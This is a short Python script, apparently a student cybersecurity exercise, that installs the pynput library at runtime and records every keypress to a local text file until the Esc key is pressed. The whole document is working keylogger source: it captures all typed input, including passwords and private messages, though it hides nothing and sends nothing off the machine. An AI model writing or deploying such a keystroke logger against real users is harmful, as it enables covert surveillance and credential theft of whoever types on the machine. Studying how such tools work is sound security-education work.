import os
os.system('pip install pynput')
from pynput.keyboard import Key, Listener
import time

log_file = os.path.expanduser("M:\Python\Prodigy Projects\PRODIGY_CS_TASK-04\keylog.txt")

def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key} pressed\n")
    if key == Key.esc:  # Stop key logger when Esc key is pressed
        listener.stop()

with Listener(on_press=on_press) as listener:
    listener.join()